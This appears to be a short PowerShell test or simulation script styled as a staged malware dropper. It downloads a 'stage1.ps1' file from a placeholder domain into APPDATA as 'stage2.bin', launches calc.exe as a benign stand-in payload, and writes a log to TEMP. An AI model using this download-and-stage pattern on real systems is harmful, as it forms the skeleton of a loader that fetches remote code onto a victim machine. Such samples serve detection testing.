
[CmdletBinding()]
param(
    [string]$FetchUrl = "https://adatum.com/stage1.ps1",
    [string]$DownloadPath = "$env:APPDATA\stage2.bin",
    [int]$TransferTimeout = 204
)
try { Invoke-WebRequest -Uri $FetchUrl -OutFile $DownloadPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Stage transfer failed" }
